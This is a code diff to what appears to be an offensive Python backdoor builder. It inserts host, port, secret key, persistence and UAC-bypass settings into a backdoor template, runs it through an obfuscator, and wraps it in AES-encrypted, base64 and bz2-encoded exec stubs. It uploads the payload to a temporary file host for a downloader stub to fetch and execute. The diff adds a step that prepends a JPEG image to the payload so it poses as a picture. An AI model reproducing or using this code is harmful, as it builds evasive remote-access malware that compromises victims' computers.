@@ -143,7 +143,7 @@ if args.obfuscate:
 		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', "funrot('" + frot(hostname) + "')").replace('***PORT***', "funrot('" + frot(portnumber) + "')").replace('***SECRET***', "funrot('" + frot(secretkey) + "')").replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***ENV***', envvar).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2).replace('***XOR***', '%s[%s:%s]' % (junkvar, xoroffset, xoroffset + 1000)).replace('***URLO***', urlvar)
 	with open('tempobfs.py', 'wb') as o:
 		o.write(readyscript)
-	obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	readyscript = obstime.stdout.read()
 	os.remove('tempobfs.py')
 	myendings = ['from urllib2 import urlopen as %s' % (urlvar), 'from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var), 'from os import getenv as %s' % (envvar), 'from bz2 import decompress as %s' % (bz2var)]
@@ -166,14 +166,16 @@ cipher = AES.new(key)
 payload = EncodeAES(cipher, readyscript)
 downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,payload)))
 downpayload = base64.b64encode(bz2.compress(downpayload))
+with open('tools/cup.jpg', 'rb') as di:
+	downpayload = di.read() + downpayload
 
 if not args.customurl:
-	with open('background.jpg', 'wb') as df:
+	with open('cup.jpg', 'wb') as df:
 		df.write(downpayload)
 	print ' [<] Uploading payload code to tempsend..'
-	downurl = ftempsend('background.jpg')
+	downurl = ftempsend('cup.jpg')
 	print ' [*] Code uploaded to %s to expire in 1 %s.' % (downurl,expirestr)
-	os.remove('background.jpg')
+	os.remove('cup.jpg')
 	dlf = 'stubs/downloader.py'
 else:
 	with open('code.txt', 'wb') as lf:
@@ -187,7 +189,7 @@ with open(dlf, 'rb') as dl:
 	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar)
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
-obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
 cipher = AES.new(key2)
